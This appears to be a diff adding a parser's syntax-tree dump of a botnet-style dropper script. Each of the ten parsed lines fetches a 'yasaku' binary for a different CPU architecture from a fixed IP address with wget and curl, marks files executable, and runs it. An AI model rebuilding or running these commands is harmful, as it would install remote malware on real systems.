@@ -1,0 +1,550 @@
+ListNode(lineno=2, pos=(12, 199), parts=[
+  CommandNode(lineno=2, pos=(12, 19), parts=[
+    WordNode(lineno=2, pos=(12, 14), word='cd'),
+    WordNode(lineno=2, pos=(15, 19), word='/tmp'),
+  ]),
+  OperatorNode(lineno=2, op='||', pos=(20, 22)),
+  CommandNode(lineno=2, pos=(23, 34), parts=[
+    WordNode(lineno=2, pos=(23, 25), word='cd'),
+    WordNode(lineno=2, pos=(26, 34), word='/var/run'),
+  ]),
+  OperatorNode(lineno=2, op='||', pos=(35, 37)),
+  CommandNode(lineno=2, pos=(38, 45), parts=[
+    WordNode(lineno=2, pos=(38, 40), word='cd'),
+    WordNode(lineno=2, pos=(41, 45), word='/mnt'),
+  ]),
+  OperatorNode(lineno=2, op='||', pos=(46, 48)),
+  CommandNode(lineno=2, pos=(49, 57), parts=[
+    WordNode(lineno=2, pos=(49, 51), word='cd'),
+    WordNode(lineno=2, pos=(52, 57), word='/root'),
+  ]),
+  OperatorNode(lineno=2, op='||', pos=(58, 60)),
+  CommandNode(lineno=2, pos=(61, 65), parts=[
+    WordNode(lineno=2, pos=(61, 63), word='cd'),
+    WordNode(lineno=2, pos=(64, 65), word='/'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(65, 66)),
+  CommandNode(lineno=2, pos=(67, 107), parts=[
+    WordNode(lineno=2, pos=(67, 71), word='wget'),
+    WordNode(lineno=2, pos=(72, 107), word='http://167.99.39.63/bins/yasaku.x86'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(107, 108)),
+  CommandNode(lineno=2, pos=(109, 152), parts=[
+    WordNode(lineno=2, pos=(109, 113), word='curl'),
+    WordNode(lineno=2, pos=(114, 116), word='-O'),
+    WordNode(lineno=2, pos=(117, 152), word='http://167.99.39.63/bins/yasaku.x86'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(152, 153)),
+  CommandNode(lineno=2, pos=(153, 172), parts=[
+    WordNode(lineno=2, pos=(153, 156), word='cat'),
+    WordNode(lineno=2, pos=(157, 167), word='yasaku.x86'),
+    RedirectNode(lineno=2, output=
+      WordNode(lineno=2, pos=(169, 172), word='tmp'), pos=(168, 172), type='>'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(172, 173)),
+  CommandNode(lineno=2, pos=(173, 183), parts=[
+    WordNode(lineno=2, pos=(173, 178), word='chmod'),
+    WordNode(lineno=2, pos=(179, 181), word='+x'),
+    WordNode(lineno=2, pos=(182, 183), word='*'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(183, 184)),
+  CommandNode(lineno=2, pos=(184, 199), parts=[
+    WordNode(lineno=2, pos=(184, 189), word='./tmp'),
+    WordNode(lineno=2, pos=(190, 199), word='roots.ssh'),
+  ]),
+])
+ListNode(lineno=3, pos=(200, 390), parts=[
+  CommandNode(lineno=3, pos=(200, 207), parts=[
+    WordNode(lineno=3, pos=(200, 202), word='cd'),
+    WordNode(lineno=3, pos=(203, 207), word='/tmp'),
+  ]),
+  OperatorNode(lineno=3, op='||', pos=(208, 210)),
+  CommandNode(lineno=3, pos=(211, 222), parts=[
+    WordNode(lineno=3, pos=(211, 213), word='cd'),
+    WordNode(lineno=3, pos=(214, 222), word='/var/run'),
+  ]),
+  OperatorNode(lineno=3, op='||', pos=(223, 225)),
+  CommandNode(lineno=3, pos=(226, 233), parts=[
+    WordNode(lineno=3, pos=(226, 228), word='cd'),
+    WordNode(lineno=3, pos=(229, 233), word='/mnt'),
+  ]),
+  OperatorNode(lineno=3, op='||', pos=(234, 236)),
+  CommandNode(lineno=3, pos=(237, 245), parts=[
+    WordNode(lineno=3, pos=(237, 239), word='cd'),
+    WordNode(lineno=3, pos=(240, 245), word='/root'),
+  ]),
+  OperatorNode(lineno=3, op='||', pos=(246, 248)),
+  CommandNode(lineno=3, pos=(249, 253), parts=[
+    WordNode(lineno=3, pos=(249, 251), word='cd'),
+    WordNode(lineno=3, pos=(252, 253), word='/'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(253, 254)),
+  CommandNode(lineno=3, pos=(255, 296), parts=[
+    WordNode(lineno=3, pos=(255, 259), word='wget'),
+    WordNode(lineno=3, pos=(260, 296), word='http://167.99.39.63/bins/yasaku.mips'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(296, 297)),
+  CommandNode(lineno=3, pos=(298, 342), parts=[
+    WordNode(lineno=3, pos=(298, 302), word='curl'),
+    WordNode(lineno=3, pos=(303, 305), word='-O'),
+    WordNode(lineno=3, pos=(306, 342), word='http://167.99.39.63/bins/yasaku.mips'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(342, 343)),
+  CommandNode(lineno=3, pos=(343, 363), parts=[
+    WordNode(lineno=3, pos=(343, 346), word='cat'),
+    WordNode(lineno=3, pos=(347, 358), word='yasaku.mips'),
+    RedirectNode(lineno=3, output=
+      WordNode(lineno=3, pos=(360, 363), word='tmp'), pos=(359, 363), type='>'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(363, 364)),
+  CommandNode(lineno=3, pos=(364, 374), parts=[
+    WordNode(lineno=3, pos=(364, 369), word='chmod'),
+    WordNode(lineno=3, pos=(370, 372), word='+x'),
+    WordNode(lineno=3, pos=(373, 374), word='*'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(374, 375)),
+  CommandNode(lineno=3, pos=(375, 390), parts=[
+    WordNode(lineno=3, pos=(375, 380), word='./tmp'),
+    WordNode(lineno=3, pos=(381, 390), word='roots.ssh'),
+  ]),
+])
+ListNode(lineno=4, pos=(391, 581), parts=[
+  CommandNode(lineno=4, pos=(391, 398), parts=[
+    WordNode(lineno=4, pos=(391, 393), word='cd'),
+    WordNode(lineno=4, pos=(394, 398), word='/tmp'),
+  ]),
+  OperatorNode(lineno=4, op='||', pos=(399, 401)),
+  CommandNode(lineno=4, pos=(402, 413), parts=[
+    WordNode(lineno=4, pos=(402, 404), word='cd'),
+    WordNode(lineno=4, pos=(405, 413), word='/var/run'),
+  ]),
+  OperatorNode(lineno=4, op='||', pos=(414, 416)),
+  CommandNode(lineno=4, pos=(417, 424), parts=[
+    WordNode(lineno=4, pos=(417, 419), word='cd'),
+    WordNode(lineno=4, pos=(420, 424), word='/mnt'),
+  ]),
+  OperatorNode(lineno=4, op='||', pos=(425, 427)),
+  CommandNode(lineno=4, pos=(428, 436), parts=[
+    WordNode(lineno=4, pos=(428, 430), word='cd'),
+    WordNode(lineno=4, pos=(431, 436), word='/root'),
+  ]),
+  OperatorNode(lineno=4, op='||', pos=(437, 439)),
+  CommandNode(lineno=4, pos=(440, 444), parts=[
+    WordNode(lineno=4, pos=(440, 442), word='cd'),
+    WordNode(lineno=4, pos=(443, 444), word='/'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(444, 445)),
+  CommandNode(lineno=4, pos=(446, 487), parts=[
+    WordNode(lineno=4, pos=(446, 450), word='wget'),
+    WordNode(lineno=4, pos=(451, 487), word='http://167.99.39.63/bins/yasaku.mpsl'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(487, 488)),
+  CommandNode(lineno=4, pos=(489, 533), parts=[
+    WordNode(lineno=4, pos=(489, 493), word='curl'),
+    WordNode(lineno=4, pos=(494, 496), word='-O'),
+    WordNode(lineno=4, pos=(497, 533), word='http://167.99.39.63/bins/yasaku.mpsl'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(533, 534)),
+  CommandNode(lineno=4, pos=(534, 554), parts=[
+    WordNode(lineno=4, pos=(534, 537), word='cat'),
+    WordNode(lineno=4, pos=(538, 549), word='yasaku.mpsl'),
+    RedirectNode(lineno=4, output=
+      WordNode(lineno=4, pos=(551, 554), word='tmp'), pos=(550, 554), type='>'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(554, 555)),
+  CommandNode(lineno=4, pos=(555, 565), parts=[
+    WordNode(lineno=4, pos=(555, 560), word='chmod'),
+    WordNode(lineno=4, pos=(561, 563), word='+x'),
+    WordNode(lineno=4, pos=(564, 565), word='*'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(565, 566)),
+  CommandNode(lineno=4, pos=(566, 581), parts=[
+    WordNode(lineno=4, pos=(566, 571), word='./tmp'),
+    WordNode(lineno=4, pos=(572, 581), word='roots.ssh'),
+  ]),
+])
+ListNode(lineno=5, pos=(582, 772), parts=[
+  CommandNode(lineno=5, pos=(582, 589), parts=[
+    WordNode(lineno=5, pos=(582, 584), word='cd'),
+    WordNode(lineno=5, pos=(585, 589), word='/tmp'),
+  ]),
+  OperatorNode(lineno=5, op='||', pos=(590, 592)),
+  CommandNode(lineno=5, pos=(593, 604), parts=[
+    WordNode(lineno=5, pos=(593, 595), word='cd'),
+    WordNode(lineno=5, pos=(596, 604), word='/var/run'),
+  ]),
+  OperatorNode(lineno=5, op='||', pos=(605, 607)),
+  CommandNode(lineno=5, pos=(608, 615), parts=[
+    WordNode(lineno=5, pos=(608, 610), word='cd'),
+    WordNode(lineno=5, pos=(611, 615), word='/mnt'),
+  ]),
+  OperatorNode(lineno=5, op='||', pos=(616, 618)),
+  CommandNode(lineno=5, pos=(619, 627), parts=[
+    WordNode(lineno=5, pos=(619, 621), word='cd'),
+    WordNode(lineno=5, pos=(622, 627), word='/root'),
+  ]),
+  OperatorNode(lineno=5, op='||', pos=(628, 630)),
+  CommandNode(lineno=5, pos=(631, 635), parts=[
+    WordNode(lineno=5, pos=(631, 633), word='cd'),
+    WordNode(lineno=5, pos=(634, 635), word='/'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(635, 636)),
+  CommandNode(lineno=5, pos=(637, 678), parts=[
+    WordNode(lineno=5, pos=(637, 641), word='wget'),
+    WordNode(lineno=5, pos=(642, 678), word='http://167.99.39.63/bins/yasaku.arm4'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(678, 679)),
+  CommandNode(lineno=5, pos=(680, 724), parts=[
+    WordNode(lineno=5, pos=(680, 684), word='curl'),
+    WordNode(lineno=5, pos=(685, 687), word='-O'),
+    WordNode(lineno=5, pos=(688, 724), word='http://167.99.39.63/bins/yasaku.arm4'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(724, 725)),
+  CommandNode(lineno=5, pos=(725, 745), parts=[
+    WordNode(lineno=5, pos=(725, 728), word='cat'),
+    WordNode(lineno=5, pos=(729, 740), word='yasaku.arm4'),
+    RedirectNode(lineno=5, output=
+      WordNode(lineno=5, pos=(742, 745), word='tmp'), pos=(741, 745), type='>'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(745, 746)),
+  CommandNode(lineno=5, pos=(746, 756), parts=[
+    WordNode(lineno=5, pos=(746, 751), word='chmod'),
+    WordNode(lineno=5, pos=(752, 754), word='+x'),
+    WordNode(lineno=5, pos=(755, 756), word='*'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(756, 757)),
+  CommandNode(lineno=5, pos=(757, 772), parts=[
+    WordNode(lineno=5, pos=(757, 762), word='./tmp'),
+    WordNode(lineno=5, pos=(763, 772), word='roots.ssh'),
+  ]),
+])
+ListNode(lineno=6, pos=(773, 963), parts=[
+  CommandNode(lineno=6, pos=(773, 780), parts=[
+    WordNode(lineno=6, pos=(773, 775), word='cd'),
+    WordNode(lineno=6, pos=(776, 780), word='/tmp'),
+  ]),
+  OperatorNode(lineno=6, op='||', pos=(781, 783)),
+  CommandNode(lineno=6, pos=(784, 795), parts=[
+    WordNode(lineno=6, pos=(784, 786), word='cd'),
+    WordNode(lineno=6, pos=(787, 795), word='/var/run'),
+  ]),
+  OperatorNode(lineno=6, op='||', pos=(796, 798)),
+  CommandNode(lineno=6, pos=(799, 806), parts=[
+    WordNode(lineno=6, pos=(799, 801), word='cd'),
+    WordNode(lineno=6, pos=(802, 806), word='/mnt'),
+  ]),
+  OperatorNode(lineno=6, op='||', pos=(807, 809)),
+  CommandNode(lineno=6, pos=(810, 818), parts=[
+    WordNode(lineno=6, pos=(810, 812), word='cd'),
+    WordNode(lineno=6, pos=(813, 818), word='/root'),
+  ]),
+  OperatorNode(lineno=6, op='||', pos=(819, 821)),
+  CommandNode(lineno=6, pos=(822, 826), parts=[
+    WordNode(lineno=6, pos=(822, 824), word='cd'),
+    WordNode(lineno=6, pos=(825, 826), word='/'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(826, 827)),
+  CommandNode(lineno=6, pos=(828, 869), parts=[
+    WordNode(lineno=6, pos=(828, 832), word='wget'),
+    WordNode(lineno=6, pos=(833, 869), word='http://167.99.39.63/bins/yasaku.arm5'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(869, 870)),
+  CommandNode(lineno=6, pos=(871, 915), parts=[
+    WordNode(lineno=6, pos=(871, 875), word='curl'),
+    WordNode(lineno=6, pos=(876, 878), word='-O'),
+    WordNode(lineno=6, pos=(879, 915), word='http://167.99.39.63/bins/yasaku.arm5'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(915, 916)),
+  CommandNode(lineno=6, pos=(916, 936), parts=[
+    WordNode(lineno=6, pos=(916, 919), word='cat'),
+    WordNode(lineno=6, pos=(920, 931), word='yasaku.arm5'),
+    RedirectNode(lineno=6, output=
+      WordNode(lineno=6, pos=(933, 936), word='tmp'), pos=(932, 936), type='>'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(936, 937)),
+  CommandNode(lineno=6, pos=(937, 947), parts=[
+    WordNode(lineno=6, pos=(937, 942), word='chmod'),
+    WordNode(lineno=6, pos=(943, 945), word='+x'),
+    WordNode(lineno=6, pos=(946, 947), word='*'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(947, 948)),
+  CommandNode(lineno=6, pos=(948, 963), parts=[
+    WordNode(lineno=6, pos=(948, 953), word='./tmp'),
+    WordNode(lineno=6, pos=(954, 963), word='roots.ssh'),
+  ]),
+])
+ListNode(lineno=7, pos=(964, 1154), parts=[
+  CommandNode(lineno=7, pos=(964, 971), parts=[
+    WordNode(lineno=7, pos=(964, 966), word='cd'),
+    WordNode(lineno=7, pos=(967, 971), word='/tmp'),
+  ]),
+  OperatorNode(lineno=7, op='||', pos=(972, 974)),
+  CommandNode(lineno=7, pos=(975, 986), parts=[
+    WordNode(lineno=7, pos=(975, 977), word='cd'),
+    WordNode(lineno=7, pos=(978, 986), word='/var/run'),
+  ]),
+  OperatorNode(lineno=7, op='||', pos=(987, 989)),
+  CommandNode(lineno=7, pos=(990, 997), parts=[
+    WordNode(lineno=7, pos=(990, 992), word='cd'),
+    WordNode(lineno=7, pos=(993, 997), word='/mnt'),
+  ]),
+  OperatorNode(lineno=7, op='||', pos=(998, 1000)),
+  CommandNode(lineno=7, pos=(1001, 1009), parts=[
+    WordNode(lineno=7, pos=(1001, 1003), word='cd'),
+    WordNode(lineno=7, pos=(1004, 1009), word='/root'),
+  ]),
+  OperatorNode(lineno=7, op='||', pos=(1010, 1012)),
+  CommandNode(lineno=7, pos=(1013, 1017), parts=[
+    WordNode(lineno=7, pos=(1013, 1015), word='cd'),
+    WordNode(lineno=7, pos=(1016, 1017), word='/'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(1017, 1018)),
+  CommandNode(lineno=7, pos=(1019, 1060), parts=[
+    WordNode(lineno=7, pos=(1019, 1023), word='wget'),
+    WordNode(lineno=7, pos=(1024, 1060), word='http://167.99.39.63/bins/yasaku.arm6'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(1060, 1061)),
+  CommandNode(lineno=7, pos=(1062, 1106), parts=[
+    WordNode(lineno=7, pos=(1062, 1066), word='curl'),
+    WordNode(lineno=7, pos=(1067, 1069), word='-O'),
+    WordNode(lineno=7, pos=(1070, 1106), word='http://167.99.39.63/bins/yasaku.arm6'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(1106, 1107)),
+  CommandNode(lineno=7, pos=(1107, 1127), parts=[
+    WordNode(lineno=7, pos=(1107, 1110), word='cat'),
+    WordNode(lineno=7, pos=(1111, 1122), word='yasaku.arm6'),
+    RedirectNode(lineno=7, output=
+      WordNode(lineno=7, pos=(1124, 1127), word='tmp'), pos=(1123, 1127), type='>'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(1127, 1128)),
+  CommandNode(lineno=7, pos=(1128, 1138), parts=[
+    WordNode(lineno=7, pos=(1128, 1133), word='chmod'),
+    WordNode(lineno=7, pos=(1134, 1136), word='+x'),
+    WordNode(lineno=7, pos=(1137, 1138), word='*'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(1138, 1139)),
+  CommandNode(lineno=7, pos=(1139, 1154), parts=[
+    WordNode(lineno=7, pos=(1139, 1144), word='./tmp'),
+    WordNode(lineno=7, pos=(1145, 1154), word='roots.ssh'),
+  ]),
+])
+ListNode(lineno=8, pos=(1155, 1345), parts=[
+  CommandNode(lineno=8, pos=(1155, 1162), parts=[
+    WordNode(lineno=8, pos=(1155, 1157), word='cd'),
+    WordNode(lineno=8, pos=(1158, 1162), word='/tmp'),
+  ]),
+  OperatorNode(lineno=8, op='||', pos=(1163, 1165)),
+  CommandNode(lineno=8, pos=(1166, 1177), parts=[
+    WordNode(lineno=8, pos=(1166, 1168), word='cd'),
+    WordNode(lineno=8, pos=(1169, 1177), word='/var/run'),
+  ]),
+  OperatorNode(lineno=8, op='||', pos=(1178, 1180)),
+  CommandNode(lineno=8, pos=(1181, 1188), parts=[
+    WordNode(lineno=8, pos=(1181, 1183), word='cd'),
+    WordNode(lineno=8, pos=(1184, 1188), word='/mnt'),
+  ]),
+  OperatorNode(lineno=8, op='||', pos=(1189, 1191)),
+  CommandNode(lineno=8, pos=(1192, 1200), parts=[
+    WordNode(lineno=8, pos=(1192, 1194), word='cd'),
+    WordNode(lineno=8, pos=(1195, 1200), word='/root'),
+  ]),
+  OperatorNode(lineno=8, op='||', pos=(1201, 1203)),
+  CommandNode(lineno=8, pos=(1204, 1208), parts=[
+    WordNode(lineno=8, pos=(1204, 1206), word='cd'),
+    WordNode(lineno=8, pos=(1207, 1208), word='/'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(1208, 1209)),
+  CommandNode(lineno=8, pos=(1210, 1251), parts=[
+    WordNode(lineno=8, pos=(1210, 1214), word='wget'),
+    WordNode(lineno=8, pos=(1215, 1251), word='http://167.99.39.63/bins/yasaku.arm7'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(1251, 1252)),
+  CommandNode(lineno=8, pos=(1253, 1297), parts=[
+    WordNode(lineno=8, pos=(1253, 1257), word='curl'),
+    WordNode(lineno=8, pos=(1258, 1260), word='-O'),
+    WordNode(lineno=8, pos=(1261, 1297), word='http://167.99.39.63/bins/yasaku.arm7'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(1297, 1298)),
+  CommandNode(lineno=8, pos=(1298, 1318), parts=[
+    WordNode(lineno=8, pos=(1298, 1301), word='cat'),
+    WordNode(lineno=8, pos=(1302, 1313), word='yasaku.arm7'),
+    RedirectNode(lineno=8, output=
+      WordNode(lineno=8, pos=(1315, 1318), word='tmp'), pos=(1314, 1318), type='>'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(1318, 1319)),
+  CommandNode(lineno=8, pos=(1319, 1329), parts=[
+    WordNode(lineno=8, pos=(1319, 1324), word='chmod'),
+    WordNode(lineno=8, pos=(1325, 1327), word='+x'),
+    WordNode(lineno=8, pos=(1328, 1329), word='*'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(1329, 1330)),
+  CommandNode(lineno=8, pos=(1330, 1345), parts=[
+    WordNode(lineno=8, pos=(1330, 1335), word='./tmp'),
+    WordNode(lineno=8, pos=(1336, 1345), word='roots.ssh'),
+  ]),
+])
+ListNode(lineno=9, pos=(1346, 1533), parts=[
+  CommandNode(lineno=9, pos=(1346, 1353), parts=[
+    WordNode(lineno=9, pos=(1346, 1348), word='cd'),
+    WordNode(lineno=9, pos=(1349, 1353), word='/tmp'),
+  ]),
+  OperatorNode(lineno=9, op='||', pos=(1354, 1356)),
+  CommandNode(lineno=9, pos=(1357, 1368), parts=[
+    WordNode(lineno=9, pos=(1357, 1359), word='cd'),
+    WordNode(lineno=9, pos=(1360, 1368), word='/var/run'),
+  ]),
+  OperatorNode(lineno=9, op='||', pos=(1369, 1371)),
+  CommandNode(lineno=9, pos=(1372, 1379), parts=[
+    WordNode(lineno=9, pos=(1372, 1374), word='cd'),
+    WordNode(lineno=9, pos=(1375, 1379), word='/mnt'),
+  ]),
+  OperatorNode(lineno=9, op='||', pos=(1380, 1382)),
+  CommandNode(lineno=9, pos=(1383, 1391), parts=[
+    WordNode(lineno=9, pos=(1383, 1385), word='cd'),
+    WordNode(lineno=9, pos=(1386, 1391), word='/root'),
+  ]),
+  OperatorNode(lineno=9, op='||', pos=(1392, 1394)),
+  CommandNode(lineno=9, pos=(1395, 1399), parts=[
+    WordNode(lineno=9, pos=(1395, 1397), word='cd'),
+    WordNode(lineno=9, pos=(1398, 1399), word='/'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1399, 1400)),
+  CommandNode(lineno=9, pos=(1401, 1441), parts=[
+    WordNode(lineno=9, pos=(1401, 1405), word='wget'),
+    WordNode(lineno=9, pos=(1406, 1441), word='http://167.99.39.63/bins/yasaku.ppc'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1441, 1442)),
+  CommandNode(lineno=9, pos=(1443, 1486), parts=[
+    WordNode(lineno=9, pos=(1443, 1447), word='curl'),
+    WordNode(lineno=9, pos=(1448, 1450), word='-O'),
+    WordNode(lineno=9, pos=(1451, 1486), word='http://167.99.39.63/bins/yasaku.ppc'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1486, 1487)),
+  CommandNode(lineno=9, pos=(1487, 1506), parts=[
+    WordNode(lineno=9, pos=(1487, 1490), word='cat'),
+    WordNode(lineno=9, pos=(1491, 1501), word='yasaku.ppc'),
+    RedirectNode(lineno=9, output=
+      WordNode(lineno=9, pos=(1503, 1506), word='tmp'), pos=(1502, 1506), type='>'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1506, 1507)),
+  CommandNode(lineno=9, pos=(1507, 1517), parts=[
+    WordNode(lineno=9, pos=(1507, 1512), word='chmod'),
+    WordNode(lineno=9, pos=(1513, 1515), word='+x'),
+    WordNode(lineno=9, pos=(1516, 1517), word='*'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1517, 1518)),
+  CommandNode(lineno=9, pos=(1518, 1533), parts=[
+    WordNode(lineno=9, pos=(1518, 1523), word='./tmp'),
+    WordNode(lineno=9, pos=(1524, 1533), word='roots.ssh'),
+  ]),
+])
+ListNode(lineno=10, pos=(1534, 1724), parts=[
+  CommandNode(lineno=10, pos=(1534, 1541), parts=[
+    WordNode(lineno=10, pos=(1534, 1536), word='cd'),
+    WordNode(lineno=10, pos=(1537, 1541), word='/tmp'),
+  ]),
+  OperatorNode(lineno=10, op='||', pos=(1542, 1544)),
+  CommandNode(lineno=10, pos=(1545, 1556), parts=[
+    WordNode(lineno=10, pos=(1545, 1547), word='cd'),
+    WordNode(lineno=10, pos=(1548, 1556), word='/var/run'),
+  ]),
+  OperatorNode(lineno=10, op='||', pos=(1557, 1559)),
+  CommandNode(lineno=10, pos=(1560, 1567), parts=[
+    WordNode(lineno=10, pos=(1560, 1562), word='cd'),
+    WordNode(lineno=10, pos=(1563, 1567), word='/mnt'),
+  ]),
+  OperatorNode(lineno=10, op='||', pos=(1568, 1570)),
+  CommandNode(lineno=10, pos=(1571, 1579), parts=[
+    WordNode(lineno=10, pos=(1571, 1573), word='cd'),
+    WordNode(lineno=10, pos=(1574, 1579), word='/root'),
+  ]),
+  OperatorNode(lineno=10, op='||', pos=(1580, 1582)),
+  CommandNode(lineno=10, pos=(1583, 1587), parts=[
+    WordNode(lineno=10, pos=(1583, 1585), word='cd'),
+    WordNode(lineno=10, pos=(1586, 1587), word='/'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(1587, 1588)),
+  CommandNode(lineno=10, pos=(1589, 1630), parts=[
+    WordNode(lineno=10, pos=(1589, 1593), word='wget'),
+    WordNode(lineno=10, pos=(1594, 1630), word='http://167.99.39.63/bins/yasaku.m68k'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(1630, 1631)),
+  CommandNode(lineno=10, pos=(1632, 1676), parts=[
+    WordNode(lineno=10, pos=(1632, 1636), word='curl'),
+    WordNode(lineno=10, pos=(1637, 1639), word='-O'),
+    WordNode(lineno=10, pos=(1640, 1676), word='http://167.99.39.63/bins/yasaku.m68k'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(1676, 1677)),
+  CommandNode(lineno=10, pos=(1677, 1697), parts=[
+    WordNode(lineno=10, pos=(1677, 1680), word='cat'),
+    WordNode(lineno=10, pos=(1681, 1692), word='yasaku.m68k'),
+    RedirectNode(lineno=10, output=
+      WordNode(lineno=10, pos=(1694, 1697), word='tmp'), pos=(1693, 1697), type='>'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(1697, 1698)),
+  CommandNode(lineno=10, pos=(1698, 1708), parts=[
+    WordNode(lineno=10, pos=(1698, 1703), word='chmod'),
+    WordNode(lineno=10, pos=(1704, 1706), word='+x'),
+    WordNode(lineno=10, pos=(1707, 1708), word='*'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(1708, 1709)),
+  CommandNode(lineno=10, pos=(1709, 1724), parts=[
+    WordNode(lineno=10, pos=(1709, 1714), word='./tmp'),
+    WordNode(lineno=10, pos=(1715, 1724), word='roots.ssh'),
+  ]),
+])
+ListNode(lineno=11, pos=(1725, 1912), parts=[
+  CommandNode(lineno=11, pos=(1725, 1732), parts=[
+    WordNode(lineno=11, pos=(1725, 1727), word='cd'),
+    WordNode(lineno=11, pos=(1728, 1732), word='/tmp'),
+  ]),
+  OperatorNode(lineno=11, op='||', pos=(1733, 1735)),
+  CommandNode(lineno=11, pos=(1736, 1747), parts=[
+    WordNode(lineno=11, pos=(1736, 1738), word='cd'),
+    WordNode(lineno=11, pos=(1739, 1747), word='/var/run'),
+  ]),
+  OperatorNode(lineno=11, op='||', pos=(1748, 1750)),
+  CommandNode(lineno=11, pos=(1751, 1758), parts=[
+    WordNode(lineno=11, pos=(1751, 1753), word='cd'),
+    WordNode(lineno=11, pos=(1754, 1758), word='/mnt'),
+  ]),
+  OperatorNode(lineno=11, op='||', pos=(1759, 1761)),
+  CommandNode(lineno=11, pos=(1762, 1770), parts=[
+    WordNode(lineno=11, pos=(1762, 1764), word='cd'),
+    WordNode(lineno=11, pos=(1765, 1770), word='/root'),
+  ]),
+  OperatorNode(lineno=11, op='||', pos=(1771, 1773)),
+  CommandNode(lineno=11, pos=(1774, 1778), parts=[
+    WordNode(lineno=11, pos=(1774, 1776), word='cd'),
+    WordNode(lineno=11, pos=(1777, 1778), word='/'),
+  ]),
+  OperatorNode(lineno=11, op=';', pos=(1778, 1779)),
+  CommandNode(lineno=11, pos=(1780, 1820), parts=[
+    WordNode(lineno=11, pos=(1780, 1784), word='wget'),
+    WordNode(lineno=11, pos=(1785, 1820), word='http://167.99.39.63/bins/yasaku.sh4'),
+  ]),
+  OperatorNode(lineno=11, op=';', pos=(1820, 1821)),
+  CommandNode(lineno=11, pos=(1822, 1865), parts=[
+    WordNode(lineno=11, pos=(1822, 1826), word='curl'),
+    WordNode(lineno=11, pos=(1827, 1829), word='-O'),
+    WordNode(lineno=11, pos=(1830, 1865), word='http://167.99.39.63/bins/yasaku.sh4'),
+  ]),
+  OperatorNode(lineno=11, op=';', pos=(1865, 1866)),
+  CommandNode(lineno=11, pos=(1866, 1885), parts=[
+    WordNode(lineno=11, pos=(1866, 1869), word='cat'),
+    WordNode(lineno=11, pos=(1870, 1880), word='yasaku.sh4'),
+    RedirectNode(lineno=11, output=
+      WordNode(lineno=11, pos=(1882, 1885), word='tmp'), pos=(1881, 1885), type='>'),
+  ]),
+  OperatorNode(lineno=11, op=';', pos=(1885, 1886)),
+  CommandNode(lineno=11, pos=(1886, 1896), parts=[
+    WordNode(lineno=11, pos=(1886, 1891), word='chmod'),
+    WordNode(lineno=11, pos=(1892, 1894), word='+x'),
+    WordNode(lineno=11, pos=(1895, 1896), word='*'),
+  ]),
+  OperatorNode(lineno=11, op=';', pos=(1896, 1897)),
+  CommandNode(lineno=11, pos=(1897, 1912), parts=[
+    WordNode(lineno=11, pos=(1897, 1902), word='./tmp'),
+    WordNode(lineno=11, pos=(1903, 1912), word='roots.ssh'),
+  ]),
+])
